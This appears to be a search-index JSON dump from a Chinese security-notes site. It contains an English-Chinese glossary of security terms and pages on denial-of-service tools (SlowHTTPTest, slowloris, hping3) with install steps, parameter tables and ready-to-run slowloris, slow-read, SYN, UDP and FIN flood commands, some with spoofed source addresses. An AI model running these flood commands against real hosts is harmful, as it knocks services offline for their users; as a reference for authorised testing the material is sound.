\u7f51\u7edc\u51c6\u5165\u63a7\u5236 NAC network security \u7f51\u7edc\u5b89\u5168 network traffic analysis \u7f51\u7edc\u6d41\u91cf\u5206\u6790 NTA one-time password \u4e00\u6b21\u6027\u5bc6\u7801 OTP open source security information management \u5f00\u6e90\u5b89\u5168\u4fe1\u606f\u7ba1\u7406 OSSIM open web application security project Web\u5e94\u7528\u7a0b\u5e8f\u5b89\u5168\u9879\u76ee OWASP optical character recognition \u6587\u5b57\u8bc6\u522b OCR penetration testing \u6e17\u900f\u6d4b\u8bd5 personal identifiable information \u4e2a\u4eba\u8eab\u4efd\u4fe1\u606f PII personal identification number \u4e2a\u4eba\u8bc6\u522b\u53f7 PIN privileged account management \u7279\u6743\u8d26\u6237\u7ba1\u7406 PAM proof of concept \u6982\u5ff5\u9a8c\u8bc1 POC proxies \u4ee3\u7406 public key infrastructure \u516c\u94a5\u57fa\u7840\u8bbe\u65bd PKI recovery point objective \u6062\u590d\u70b9\u76ee\u6807 RPO recovery time objective \u6062\u590d\u65f6\u95f4\u76ee\u6807 RTO return on investment \u6295\u8d44\u56de\u62a5\u7387 ROI risk assessment \u98ce\u9669\u8bc4\u4f30 risk and vulnerability assessment \u98ce\u9669\u4e0e\u6f0f\u6d1e\u8bc4\u4f30 risk management \u98ce\u9669\u7ba1\u7406 risk management framework \u98ce\u9669\u7ba1\u7406\u6846\u67b6 RMF role-based access control \u57fa\u4e8e\u89d2\u8272\u7684\u8bbf\u95ee\u63a7\u5236 RBAC routers \u8def\u7531\u5668 runtime application self protection \u7a0b\u5e8f\u8fd0\u884c\u81ea\u6211\u4fdd\u62a4 RASP search processing language \u641c\u7d22\u5904\u7406\u8bed\u8a00 SPL security domain \u5b89\u5168\u57df secure email gateway \u5b89\u5168\u90ae\u4ef6\u7f51\u5173 SEG security awareness \u6001\u52bf\u611f\u77e5 SA security development lifecycle \u5b89\u5168\u5f00\u53d1\u751f\u547d\u5468\u671f SDL security event management \u5b89\u5168\u4e8b\u4ef6\u7ba1\u7406 SEM security incident \u5b89\u5168\u4e8b\u6545 security information and event management \u5b89\u5168\u4fe1\u606f\u4e0e\u4e8b\u4ef6\u7ba1\u7406 SIEM security information management \u5b89\u5168\u4fe1\u606f\u7ba1\u7406 SIM security isolation \u5b89\u5168\u9694\u79bb security operation center \u5b89\u5168\u8fd0\u8425\u4e2d\u5fc3 SOC security orchestration automation and response \u5b89\u5168\u7f16\u6392\u548c\u81ea\u52a8\u5316\u54cd\u5e94 SOAR security response center \u5b89\u5168\u54cd\u5e94\u4e2d\u5fc3 SRC security testing \u5b89\u5168\u6d4b\u8bd5 service leve agreement \u670d\u52a1\u754c\u522b\u534f\u8bae SLA service oriented architecture \u9762\u5411\u670d\u52a1\u7684\u4f53\u7cfb\u7ed3\u6784 SOA single sign on \u5355\u70b9\u767b\u5f55 SSO software composition analysis \u8f6f\u4ef6\u6210\u5206\u5206\u6790 SCA software defined network \u8f6f\u4ef6\u5b9a\u4e49\u7f51\u7edc SDN software defined perimeter \u8f6f\u4ef6\u5b9a\u4e49\u8fb9\u754c SDP software defined security \u8f6f\u4ef6\u5b9a\u4e49\u5b89\u5168 SDS switches \u4ea4\u6362\u673a threat intelligence \u5a01\u80c1\u60c5\u62a5 TI total cost of ownship \u603b\u62e5\u6709\u6210\u672c TCO trojan horse \u7279\u6d1b\u4f0a\u6728\u9a6c trusted computing base \u53ef\u4fe1\u8ba1\u7b97\u57fa trusted third stamp \u53ef\u4fe1\u7b2c\u4e09\u65b9 two factor authentication \u53cc\u56e0\u7d20\u8ba4\u8bc1 unified endpoint management \u7edf\u4e00\u7aef\u70b9\u7ba1\u7406 UEM unified identity management \u7edf\u4e00\u8eab\u4efd\u7ba1\u7406 UIM unified threat management \u7edf\u4e00\u5a01\u80c1\u7ba1\u7406 UTM user and entity behavior analytics \u7528\u6237\u548c\u4e8b\u4ef6\u884c\u4e3a\u5206\u6790 UEBA virtual private network \u865a\u62df\u4e13\u7528\u7f51\u7edc VPN wireless access point \u65e0\u7ebf\u8bbf\u95ee\u63a5\u5165\u70b9 WAP work recovery time \u5de5\u4f5c\u6062\u590d\u65f6\u95f4 WRT zero trust \u96f6\u4fe1\u4efb","title":"\u5b89\u5168\u4e2d\u82f1\u6587\u5bf9\u5e94"},{"location":"security_notes/zh-en/#_1","text":"\u82f1\u6587 \u4e2d\u6587 \u7b80\u79f0 access control decision function \u8bbf\u95ee\u63a7\u5236\u5224\u51b3\u529f\u80fd ADF access control decision information \u8bbf\u95ee\u63a7\u5236\u5224\u51b3\u4fe1\u606f ADI access control enforcement function \u8bbf\u95ee\u63a7\u5236\u5b9e\u65bd\u529f\u80fd AEF access control entries \u8bbf\u95ee\u63a7\u5236\u5165\u53e3 ACE access control information \u8bbf\u95ee\u63a7\u5236\u4fe1\u606f access control list \u8bbf\u95ee\u63a7\u5236\u5217\u8868 ACL account security \u8d26\u6237\u5b89\u5168 advance persistent threat \u9ad8\u7ea7\u6301\u7eed\u6027\u5a01\u80c1 APT agile development \u654f\u6377\u5f00\u53d1 anti-phishing project \u53cd\u9493\u9c7c\u9879\u76ee api security \u63a5\u53e3\u5b89\u5168 application programming interface \u5e94\u7528\u7f16\u7a0b\u63a5\u53e3 API artificial intelligent \u4eba\u5de5\u667a\u80fd AI assets management \u8d44\u4ea7\u7ba1\u7406 asynchronous transfer mode \u5f02\u6b65\u4f20\u8f93\u6a21\u5f0f attribute-based access control \u57fa\u4e8e\u5c5e\u6027\u7684\u8bbf\u95ee\u63a7\u5236\u6a21\u578b ABAC authentication authorization accounting \u8ba4\u8bc1\u3001\u6388\u6743\u3001\u8ba1\u5e10 3A authentication authorization accounting audit \u7edf\u4e00\u5b89\u5168\u7ba1\u7406\u5e73\u53f0\u89e3\u51b3\u65b9\u6848 4A back-end system \u540e\u7aef\u7cfb\u7edf border gateway protocol \u8fb9\u754c\u7f51\u5173\u534f\u8bae BGP bring your own device \u643a\u5e26\u81ea\u5df1\u7684\u529e\u516c\u8bbe\u5907 BYOD business assessment \u4e1a\u52a1\u8bc4\u4f30 BA business continuity institute \u4e1a\u52a1\u6301\u7eed\u6027\u534f\u4f1a BCI business continuity management \u4e1a\u52a1\u8fde\u7eed\u6027\u7ba1\u7406 BCM business continuity planning \u4e1a\u52a1\u8fde\u7eed\u6027\u8ba1\u5212 BCP business email compromise \u5546\u4e1a\u90ae\u4ef6\u5931\u9677 business impact assessment \u4e1a\u52a1\u5f71\u54cd\u8bc4\u4f30 BIA business security \u4e1a\u52a1\u5b89\u5168 captcha security \u9a8c\u8bc1\u7801\u5b89\u5168 capture the flag \u593a\u65d7\u8d5b CTF certificate \u8bc1\u4e66 CA chain of blocks \u533a\u5757\u94fe cloud access security broker \u4e91\u8bbf\u95ee\u5b89\u5168\u4ee3\u7406 CASB cloud security \u4e91\u5b89\u5168 cloud security posture management \u4e91\u5b89\u5168\u914d\u7f6e\u7ba1\u7406 CSPM cloud workload protection platforms \u4e91\u5de5\u4f5c\u8d1f\u8f7d\u4fdd\u62a4\u5e73\u53f0 CWPP code audit \u4ee3\u7801\u5ba1\u8ba1 common body of knowledge \u901a\u7528\u77e5\u8bc6\u534f\u8bae CBK complex event process \u590d\u6742\u4e8b\u4ef6\u9a71\u52a8 CEP confidentiality integrity availability \u4fdd\u5bc6\u6027 \u5b8c\u6574\u6027 \u53ef\u7528\u6027 CIA container security \u5bb9\u5668\u5b89\u5168 content disarm and reconstruction \u5185\u5bb9\u62c6\u89e3\u4e0e\u91cd\u5efa continuous delivery or development \u6301\u7eed\u4ea4\u4ed8\u6216\u90e8\u7f72 CD continuous integration \u6301\u7eed\u96c6\u6210 CI cryptography \u5bc6\u7801\u5b66 cyber security \u7f51\u7edc\u7a7a\u95f4\u5b89\u5168 data encryption standard \u6570\u636e\u52a0\u5bc6\u6807\u51c6 DES data lifecycle management \u6570\u636e\u751f\u547d\u5468\u671f\u7ba1\u7406 DLM data loss prevention \u6570\u636e\u4e22\u5931\u4fdd\u62a4 DLP data mining \u6570\u636e\u6316\u6398 data security \u6570\u636e\u5b89\u5168 denial of service \u62d2\u7edd\u670d\u52a1 DoS deception \u6b3a\u9a97\u6280\u672f development security operations DevSecOps disaster recovery planning \u707e\u96be\u6062\u590d\u8ba1\u5212 DRP discretionary access control \u81ea\u4e3b\u8bbf\u95ee\u63a7\u5236 DAC distributed denial of service \u5206\u5e03\u5f0f\u62d2\u7edd\u670d\u52a1 DDoS domain name system \u57df\u540d\u670d\u52a1 DNS elastic and scalable \u5f39\u6027\u53ef\u4f38\u7f29 elastic computing \u5f39\u6027\u8ba1\u7b97 endpoint detection and response \u7ec8\u7aef\u68c0\u6d4b\u4e0e\u54cd\u5e94 EDR endpoint protection platform \u7ec8\u7aef\u9632\u62a4\u5e73\u53f0 EPP endpoint security \u7ec8\u7aef\u5b89\u5168 enterprise mobility management \u4f01\u4e1a\u79fb\u52a8\u7ba1\u7406 EMM enterprise resource planning \u4f01\u4e1a\u8d44\u6e90\u8ba1\u5212 ERP enterprise risk management \u4f01\u4e1a\u98ce\u9669\u7ba1\u7406 ERM extraction transformation loading \u63d0\u53d6 \u8f6c\u5316 \u52a0\u8f7d ETL file transfer protocol \u6587\u4ef6\u4f20\u8f93\u534f\u8bae FTP firewall \u9632\u706b\u5899 free computing \u81ea\u7531\u8ba1\u7b97 front-end system \u524d\u7aef\u7cfb\u7edf general data protection regulation \u4e00\u822c\u6570\u636e\u4fdd\u62a4\u6761\u4f8b GDPR governance risk and compliance \u6cbb\u7406\u98ce\u9669\u4e0e\u5408\u89c4\u6027 high availability \u9ad8\u53ef\u7528\u6027 HA human computer interaction \u4eba\u673a\u4ea4\u4e92 HCI human machine interface \u4eba\u673a\u754c\u9762 HMI identify access management \u8eab\u4efd\u8bc6\u522b\u4e0e\u8bbf\u95ee\u63a7\u5236 IAM incident response \u4e8b\u4ef6\u54cd\u5e94 industrial control system \u5de5\u4e1a\u63a7\u5236\u7cfb\u7edf ICS information technology infrastructural library IT\u57fa\u7840\u7ed3\u6784 ITIL infrastructure security \u57fa\u7840\u8bbe\u65bd\u5b89\u5168 internet of things \u7269\u8054\u7f51 IOT intrusion detection system \u5165\u4fb5\u68c0\u6d4b\u7cfb\u7edf IDS intrusion prevention system \u5165\u4fb5\u9632\u5fa1\u7cfb\u7edf IPS load balancing \u8d1f\u8f7d\u5747\u8861 log analysis \u65e5\u5fd7\u5206\u6790 managed detection and response \u53ef\u7ba1\u7406\u68c0\u6d4b\u4e0e\u54cd\u5e94 MDR mandatory access control \u5f3a\u5236\u8bbf\u95ee\u63a7\u5236 MAC maximum tolerable downtime \u6700\u957f\u505c\u673a\u65f6\u95f4 MTD maximum tolerable period disruption \u6700\u957f\u4e2d\u65ad\u65f6\u95f4 MTPD mean time between failure \u5e73\u5747\u6545\u969c\u65f6\u95f4\u95f4\u9694 MTBF mean time to repair \u5e73\u5747\u4fee\u590d\u65f6\u95f4 MTTR mobile application management \u79fb\u52a8\u5e94\u7528\u7ba1\u7406 MAM mobile content management \u79fb\u52a8\u5185\u5bb9\u7ba1\u7406 MCM mobile device management \u79fb\u52a8\u8bbe\u5907\u7ba1\u7406 MDM monitoring \u76d1\u63a7 multi factor authentication \u591a\u56e0\u7d20\u8ba4\u8bc1 MFA network access control \u7f51\u7edc\u51c6\u5165\u63a7\u5236 NAC network security \u7f51\u7edc\u5b89\u5168 network traffic analysis \u7f51\u7edc\u6d41\u91cf\u5206\u6790 NTA one-time password \u4e00\u6b21\u6027\u5bc6\u7801 OTP open source security information management \u5f00\u6e90\u5b89\u5168\u4fe1\u606f\u7ba1\u7406 OSSIM open web application security project Web\u5e94\u7528\u7a0b\u5e8f\u5b89\u5168\u9879\u76ee OWASP optical character recognition \u6587\u5b57\u8bc6\u522b OCR penetration testing \u6e17\u900f\u6d4b\u8bd5 personal identifiable information \u4e2a\u4eba\u8eab\u4efd\u4fe1\u606f PII personal identification number \u4e2a\u4eba\u8bc6\u522b\u53f7 PIN privileged account management \u7279\u6743\u8d26\u6237\u7ba1\u7406 PAM proof of concept \u6982\u5ff5\u9a8c\u8bc1 POC proxies \u4ee3\u7406 public key infrastructure \u516c\u94a5\u57fa\u7840\u8bbe\u65bd PKI recovery point objective \u6062\u590d\u70b9\u76ee\u6807 RPO recovery time objective \u6062\u590d\u65f6\u95f4\u76ee\u6807 RTO return on investment \u6295\u8d44\u56de\u62a5\u7387 ROI risk assessment \u98ce\u9669\u8bc4\u4f30 risk and vulnerability assessment \u98ce\u9669\u4e0e\u6f0f\u6d1e\u8bc4\u4f30 risk management \u98ce\u9669\u7ba1\u7406 risk management framework \u98ce\u9669\u7ba1\u7406\u6846\u67b6 RMF role-based access control \u57fa\u4e8e\u89d2\u8272\u7684\u8bbf\u95ee\u63a7\u5236 RBAC routers \u8def\u7531\u5668 runtime application self protection \u7a0b\u5e8f\u8fd0\u884c\u81ea\u6211\u4fdd\u62a4 RASP search processing language \u641c\u7d22\u5904\u7406\u8bed\u8a00 SPL security domain \u5b89\u5168\u57df secure email gateway \u5b89\u5168\u90ae\u4ef6\u7f51\u5173 SEG security awareness \u6001\u52bf\u611f\u77e5 SA security development lifecycle \u5b89\u5168\u5f00\u53d1\u751f\u547d\u5468\u671f SDL security event management \u5b89\u5168\u4e8b\u4ef6\u7ba1\u7406 SEM security incident \u5b89\u5168\u4e8b\u6545 security information and event management \u5b89\u5168\u4fe1\u606f\u4e0e\u4e8b\u4ef6\u7ba1\u7406 SIEM security information management \u5b89\u5168\u4fe1\u606f\u7ba1\u7406 SIM security isolation \u5b89\u5168\u9694\u79bb security operation center \u5b89\u5168\u8fd0\u8425\u4e2d\u5fc3 SOC security orchestration automation and response \u5b89\u5168\u7f16\u6392\u548c\u81ea\u52a8\u5316\u54cd\u5e94 SOAR security response center \u5b89\u5168\u54cd\u5e94\u4e2d\u5fc3 SRC security testing \u5b89\u5168\u6d4b\u8bd5 service leve agreement \u670d\u52a1\u754c\u522b\u534f\u8bae SLA service oriented architecture \u9762\u5411\u670d\u52a1\u7684\u4f53\u7cfb\u7ed3\u6784 SOA single sign on \u5355\u70b9\u767b\u5f55 SSO software composition analysis \u8f6f\u4ef6\u6210\u5206\u5206\u6790 SCA software defined network \u8f6f\u4ef6\u5b9a\u4e49\u7f51\u7edc SDN software defined perimeter \u8f6f\u4ef6\u5b9a\u4e49\u8fb9\u754c SDP software defined security \u8f6f\u4ef6\u5b9a\u4e49\u5b89\u5168 SDS switches \u4ea4\u6362\u673a threat intelligence \u5a01\u80c1\u60c5\u62a5 TI total cost of ownship \u603b\u62e5\u6709\u6210\u672c TCO trojan horse \u7279\u6d1b\u4f0a\u6728\u9a6c trusted computing base \u53ef\u4fe1\u8ba1\u7b97\u57fa trusted third stamp \u53ef\u4fe1\u7b2c\u4e09\u65b9 two factor authentication \u53cc\u56e0\u7d20\u8ba4\u8bc1 unified endpoint management \u7edf\u4e00\u7aef\u70b9\u7ba1\u7406 UEM unified identity management \u7edf\u4e00\u8eab\u4efd\u7ba1\u7406 UIM unified threat management \u7edf\u4e00\u5a01\u80c1\u7ba1\u7406 UTM user and entity behavior analytics \u7528\u6237\u548c\u4e8b\u4ef6\u884c\u4e3a\u5206\u6790 UEBA virtual private network \u865a\u62df\u4e13\u7528\u7f51\u7edc VPN wireless access point \u65e0\u7ebf\u8bbf\u95ee\u63a5\u5165\u70b9 WAP work recovery time \u5de5\u4f5c\u6062\u590d\u65f6\u95f4 WRT zero trust \u96f6\u4fe1\u4efb","title":"\u5b89\u5168\u4e2d\u82f1\u6587\u5bf9\u5e94"},{"location":"security_tools/cc_tools/","text":"CC\u6f0f\u6d1e\u5229\u7528\u5de5\u5177 SlowHTTPTest SlowHTTPTest GitHub\u5730\u5740 Centos7\u5b89\u88c5SlowHTTPTest # \u89e3\u51b3\u4f9d\u8d56 yum install gcc.x86_64 gcc-c++.x86_64 openssl-devel.x86_64 -y yum install automake.noarch autoconf.noarch -y # \u5b89\u88c5slowhttptest tar -xf slowhttptest-1.7.tar.gz cd slowhttptest-1.7 ./configure make make install SlowHTTPTest\u53c2\u6570\u8bf4\u660e -H\uff1aSlowLoris\u6a21\u5f0f -B\uff1aSlow Post\u6a21\u5f0f -R\uff1aRange Header\u6a21\u5f0f -X\uff1aSlow Read\u6a21\u5f0f -g\uff1a\u5728\u6d4b\u8bd5\u5b8c\u6210\u540e\uff0c\u4ee5\u65f6\u95f4\u6233\u4e3a\u540d\u751f\u6210\u4e00\u4e2acvs\u548chtml\u6587\u4ef6\u7684\u7edf\u8ba1\u6570\u636e -o\uff1a\u6307\u5b9a\u8f93\u51fa\u6587\u4ef6\u540d -v\uff1a\u65e5\u5fd7\u7b49\u7ea7\uff0c0-4\uff1aFatal\u3001Info\u3001Error\u3001Warning\u3001Debug -c\uff1a\u6d4b\u8bd5\u65f6\u5efa\u7acb\u7684\u8fde\u63a5\u6570\uff0c\u9ed8\u8ba4\u4e3a50 -i\uff1a\u5728SlowLoris\u548cSlow Post\u6a21\u5f0f\u4e2d\uff0c\u6307\u5b9a\u6570\u636e\u53d1\u9001\u7684\u95f4\u9694\uff0c\u9ed8\u8ba4\u4e3a10 -l\uff1a\u6d4b\u8bd5\u7ef4\u6301\u65f6\u95f4\uff0c\u9ed8\u8ba4\u4e3a240 -r\uff1a\u6bcf\u79d2\u8fde\u63a5\u4e2a\u6570\uff0c\u9ed8\u8ba4\u4e3a50 -s\uff1a\u58f0\u660eContent-Length header\u503c\uff0c\u9ed8\u8ba4\u4e3a4096 -t\uff1ahttp verb\u5728\u8bf7\u6c42\u65f6\u4f7f\u7528\u4ec0\u4e48\u64cd\u4f5c\uff0c\u9ed8\u8ba4\u4e3aGET -u\uff1a\u6307\u5b9a\u76ee\u6807URL -x\uff1a\u5728SlowLoris\u548cSlow Post\u6a21\u5f0f\u4e2d\uff0c\u6307\u5b9a\u53d1\u9001\u7684\u6700\u5927\u6570\u636e\u957f\u5ea6 -f\uff1a\u6307\u5b9aContent-Type Header\uff0c\u9ed8\u8ba4\u4e3aapplication/x-www-form-urlencoded -m\uff1a\u6307\u5b9aAccept Header\uff0c\u9ed8\u8ba4\u4e3atext/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 -d\uff1a\u4e3a\u6240\u6709\u8fde\u63a5\u6307\u5b9a\u4ee3\u7406 -e\uff1a\u4e3a\u63a2\u6d4b\u8fde\u63a5\u6307\u5b9a\u4ee3\u7406 -p\uff1a\u6307\u5b9a\u7b49\u5f85\u65f6\u95f4\u6765\u786e\u8ba4\u653b\u51fb\u5df2\u7ecf\u6210\u529f -a\uff1aheader\u7684\u5de6\u8fb9\u754c\u5b57\u8282\u6570\uff0c\u9ed8\u8ba4\u4e3a5 -b\uff1aheader\u7684\u53f3\u8fb9\u754c\u5b57\u8282\u6570\uff0c\u9ed8\u8ba4\u4e3a2000 -k\uff1a -n\uff1a\u5728Slow Read\u6a21\u5f0f\u4e2d\uff0c\u6307\u5b9a\u6bcf\u6b21\u64cd\u4f5c\u7684\u65f6\u95f4\u95f4\u9694 -w\uff1aSlow Read\u6a21\u5f0f\u4e2d\u6307\u5b9atcp\u7a97\u53e3\u8303\u56f4\u4e0b\u9650 -y\uff1a\u5728Slow Read\u6a21\u5f0f\u4e2d\u6307\u5b9atcp\u7a97\u53e3\u8303\u56f4\u4e0a\u9650\uff0c\u9ed8\u8ba4\u4e3a32 -z\uff1a\u5728\u6bcf\u6b21\u7684read()\u4e2d\uff0c\u4ecebuffer\u4e2d\u8bfb\u53d6\u6570\u636e\u91cf\uff0c\u9ed8\u8ba4\u4e3a5 SlowHTTPTest\u6d4b\u8bd5\u6848\u4f8b # slowloris\u6a21\u5f0f slowhttptest -c 1000 -H -g -o my_header_stats -i 10 -r 200 -t GET -u https://host.example.com/index.html -x 24 -p 3 # slow post\u6a21\u5f0f slowhttptest -c 3000 -B -g -o my_body_stats -i 110 -r 200 -s 8192 -t FAKEVERB -u http://host.example.com/loginform.html -x 10 -p 3 # slow read\u6a21\u5f0f slowhttptest -c 8000 -X -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u https://host.example.com/resources/index.html -p 3 slowloris slowloris GitHub\u5730\u5740 Centos7\u5b89\u88c5slowloris pip\u5b89\u88c5slowloris source py3.7/bin/activate pip install slowloris \u975e\u5b89\u88c5\u6a21\u5f0f git clone https://github.com/gkbrk/slowloris.git cd slowloris source py3.7/bin/activate python slowloris.py slowloris\u53c2\u6570\u8bf4\u660e -p PORT\uff1a\u6307\u5b9a\u7aef\u53e3\uff0c\u9ed8\u8ba480 -s SOCKETS\uff1a\u5957\u63a5\u5b57\u6570\u91cf\uff0c\u9ed8\u8ba4150 -v\uff1a\u589e\u52a0\u65e5\u5fd7\u8bb0\u5f55 -ua\uff1a\u5bf9\u6bcf\u4e2a\u8bf7\u6c42\u968f\u673a\u5316UA\u53c2\u6570 --proxy-host PROXY_HOST\uff1aSocketS5\u4ee3\u7406\u4e3b\u673a\uff0c\u9ed8\u8ba4127.0.0.1 --porxy-port PROXY_PORT\uff1aSocketS5\u4ee3\u7406\u7aef\u53e3\uff0c\u9ed8\u8ba48080 --https\uff1a\u5bf9\u8bf7\u6c42\u4f7f\u7528https SocketS5\u4ee3\u7406\u652f\u6301\uff0c\u9700\u8981\u989d\u5916\u5b89\u88c5PySocks Python\u6a21\u5757 pip3 install PySocks slowloris\u6d4b\u8bd5\u6848\u4f8b python slowloris.py IP # \u653b\u51fbhttp 80\u7aef\u53e3 python slowloris.py -p 443 --https IP # \u653b\u51fbhttps 443\u7aef\u53e3","title":"CC\u6f0f\u6d1e\u5229\u7528\u5de5\u5177"},{"location":"security_tools/cc_tools/#cc","text":"","title":"CC\u6f0f\u6d1e\u5229\u7528\u5de5\u5177"},{"location":"security_tools/cc_tools/#slowhttptest","text":"SlowHTTPTest GitHub\u5730\u5740","title":"SlowHTTPTest"},{"location":"security_tools/cc_tools/#centos7slowhttptest","text":"# \u89e3\u51b3\u4f9d\u8d56 yum install gcc.x86_64 gcc-c++.x86_64 openssl-devel.x86_64 -y yum install automake.noarch autoconf.noarch -y # \u5b89\u88c5slowhttptest tar -xf slowhttptest-1.7.tar.gz cd slowhttptest-1.7 ./configure make make install","title":"Centos7\u5b89\u88c5SlowHTTPTest"},{"location":"security_tools/cc_tools/#slowhttptest_1","text":"-H\uff1aSlowLoris\u6a21\u5f0f -B\uff1aSlow Post\u6a21\u5f0f -R\uff1aRange Header\u6a21\u5f0f -X\uff1aSlow Read\u6a21\u5f0f -g\uff1a\u5728\u6d4b\u8bd5\u5b8c\u6210\u540e\uff0c\u4ee5\u65f6\u95f4\u6233\u4e3a\u540d\u751f\u6210\u4e00\u4e2acvs\u548chtml\u6587\u4ef6\u7684\u7edf\u8ba1\u6570\u636e -o\uff1a\u6307\u5b9a\u8f93\u51fa\u6587\u4ef6\u540d -v\uff1a\u65e5\u5fd7\u7b49\u7ea7\uff0c0-4\uff1aFatal\u3001Info\u3001Error\u3001Warning\u3001Debug -c\uff1a\u6d4b\u8bd5\u65f6\u5efa\u7acb\u7684\u8fde\u63a5\u6570\uff0c\u9ed8\u8ba4\u4e3a50 -i\uff1a\u5728SlowLoris\u548cSlow Post\u6a21\u5f0f\u4e2d\uff0c\u6307\u5b9a\u6570\u636e\u53d1\u9001\u7684\u95f4\u9694\uff0c\u9ed8\u8ba4\u4e3a10 -l\uff1a\u6d4b\u8bd5\u7ef4\u6301\u65f6\u95f4\uff0c\u9ed8\u8ba4\u4e3a240 -r\uff1a\u6bcf\u79d2\u8fde\u63a5\u4e2a\u6570\uff0c\u9ed8\u8ba4\u4e3a50 -s\uff1a\u58f0\u660eContent-Length header\u503c\uff0c\u9ed8\u8ba4\u4e3a4096 -t\uff1ahttp verb\u5728\u8bf7\u6c42\u65f6\u4f7f\u7528\u4ec0\u4e48\u64cd\u4f5c\uff0c\u9ed8\u8ba4\u4e3aGET -u\uff1a\u6307\u5b9a\u76ee\u6807URL -x\uff1a\u5728SlowLoris\u548cSlow Post\u6a21\u5f0f\u4e2d\uff0c\u6307\u5b9a\u53d1\u9001\u7684\u6700\u5927\u6570\u636e\u957f\u5ea6 -f\uff1a\u6307\u5b9aContent-Type Header\uff0c\u9ed8\u8ba4\u4e3aapplication/x-www-form-urlencoded -m\uff1a\u6307\u5b9aAccept Header\uff0c\u9ed8\u8ba4\u4e3atext/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 -d\uff1a\u4e3a\u6240\u6709\u8fde\u63a5\u6307\u5b9a\u4ee3\u7406 -e\uff1a\u4e3a\u63a2\u6d4b\u8fde\u63a5\u6307\u5b9a\u4ee3\u7406 -p\uff1a\u6307\u5b9a\u7b49\u5f85\u65f6\u95f4\u6765\u786e\u8ba4\u653b\u51fb\u5df2\u7ecf\u6210\u529f -a\uff1aheader\u7684\u5de6\u8fb9\u754c\u5b57\u8282\u6570\uff0c\u9ed8\u8ba4\u4e3a5 -b\uff1aheader\u7684\u53f3\u8fb9\u754c\u5b57\u8282\u6570\uff0c\u9ed8\u8ba4\u4e3a2000 -k\uff1a -n\uff1a\u5728Slow Read\u6a21\u5f0f\u4e2d\uff0c\u6307\u5b9a\u6bcf\u6b21\u64cd\u4f5c\u7684\u65f6\u95f4\u95f4\u9694 -w\uff1aSlow Read\u6a21\u5f0f\u4e2d\u6307\u5b9atcp\u7a97\u53e3\u8303\u56f4\u4e0b\u9650 -y\uff1a\u5728Slow Read\u6a21\u5f0f\u4e2d\u6307\u5b9atcp\u7a97\u53e3\u8303\u56f4\u4e0a\u9650\uff0c\u9ed8\u8ba4\u4e3a32 -z\uff1a\u5728\u6bcf\u6b21\u7684read()\u4e2d\uff0c\u4ecebuffer\u4e2d\u8bfb\u53d6\u6570\u636e\u91cf\uff0c\u9ed8\u8ba4\u4e3a5","title":"SlowHTTPTest\u53c2\u6570\u8bf4\u660e"},{"location":"security_tools/cc_tools/#slowhttptest_2","text":"# slowloris\u6a21\u5f0f slowhttptest -c 1000 -H -g -o my_header_stats -i 10 -r 200 -t GET -u https://host.example.com/index.html -x 24 -p 3 # slow post\u6a21\u5f0f slowhttptest -c 3000 -B -g -o my_body_stats -i 110 -r 200 -s 8192 -t FAKEVERB -u http://host.example.com/loginform.html -x 10 -p 3 # slow read\u6a21\u5f0f slowhttptest -c 8000 -X -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u https://host.example.com/resources/index.html -p 3","title":"SlowHTTPTest\u6d4b\u8bd5\u6848\u4f8b"},{"location":"security_tools/cc_tools/#slowloris","text":"slowloris GitHub\u5730\u5740","title":"slowloris"},{"location":"security_tools/cc_tools/#centos7slowloris","text":"","title":"Centos7\u5b89\u88c5slowloris"},{"location":"security_tools/cc_tools/#pipslowloris","text":"source py3.7/bin/activate pip install slowloris","title":"pip\u5b89\u88c5slowloris"},{"location":"security_tools/cc_tools/#_1","text":"git clone https://github.com/gkbrk/slowloris.git cd slowloris source py3.7/bin/activate python slowloris.py","title":"\u975e\u5b89\u88c5\u6a21\u5f0f"},{"location":"security_tools/cc_tools/#slowloris_1","text":"-p PORT\uff1a\u6307\u5b9a\u7aef\u53e3\uff0c\u9ed8\u8ba480 -s SOCKETS\uff1a\u5957\u63a5\u5b57\u6570\u91cf\uff0c\u9ed8\u8ba4150 -v\uff1a\u589e\u52a0\u65e5\u5fd7\u8bb0\u5f55 -ua\uff1a\u5bf9\u6bcf\u4e2a\u8bf7\u6c42\u968f\u673a\u5316UA\u53c2\u6570 --proxy-host PROXY_HOST\uff1aSocketS5\u4ee3\u7406\u4e3b\u673a\uff0c\u9ed8\u8ba4127.0.0.1 --porxy-port PROXY_PORT\uff1aSocketS5\u4ee3\u7406\u7aef\u53e3\uff0c\u9ed8\u8ba48080 --https\uff1a\u5bf9\u8bf7\u6c42\u4f7f\u7528https SocketS5\u4ee3\u7406\u652f\u6301\uff0c\u9700\u8981\u989d\u5916\u5b89\u88c5PySocks Python\u6a21\u5757 pip3 install PySocks","title":"slowloris\u53c2\u6570\u8bf4\u660e"},{"location":"security_tools/cc_tools/#slowloris_2","text":"python slowloris.py IP # \u653b\u51fbhttp 80\u7aef\u53e3 python slowloris.py -p 443 --https IP # \u653b\u51fbhttps 443\u7aef\u53e3","title":"slowloris\u6d4b\u8bd5\u6848\u4f8b"},{"location":"security_tools/ddos_tools/","text":"DoS\u4e0eDDoS\u5229\u7528\u5de5\u5177 hping3 hping3\u5b98\u7f51\u5730\u5740 Centos7\u5b89\u88c5hping3 # \u5b89\u88c5\u4f9d\u8d56 yum install gcc.x86_64 libpcap-devel.x86_64 tcl-devel -y # \u4e0b\u8f7d\u5b89\u88c5\u5305 wget http://www.hping.org/hping3-20051105.tar.gz tar -xf hping3-20051105.tar.gz cd hping3-20051105 # \u7f16\u8bd1\u5b89\u88c5 ./configure # \u6b64\u65f6\u62a5\u9519\u5982\u4e0b # \u4fee\u6539\u6587\u4ef6\uff0c\u4fee\u6539\u5185\u5bb9\u5982\u56fe vim bytesex.h # \u4fee\u6539\u5b8c\u6210\u540e\uff0c\u91cd\u65b0\u7f16\u8bd1 ./configure make # \u6b64\u65f6\u62a5\u9519\u5982\u4e0b # \u89e3\u51b3\u65b9\u6848 ln -s /usr/include/pcap-bpf.h /usr/include/net/bpf.h # \u5b8c\u6210\u4ee5\u540e\u518d\u6b21\u5b89\u88c5 make make install hping3\u4f7f\u7528\u6848\u4f8b # \u6d4b\u8bd5SYN Flood hping3 -S --flood -V -p PORT IP hping3 -c 20000 -d 120 -S -w 64 -p PORT --flood --rand-source IP # \u968f\u673a\u6e90IP # \u6d4b\u8bd5UDP Flood hping3 --flood --rand-source --udp -p PORT IP # \u6d4b\u8bd5TCP FIN Flood hping3 --flood 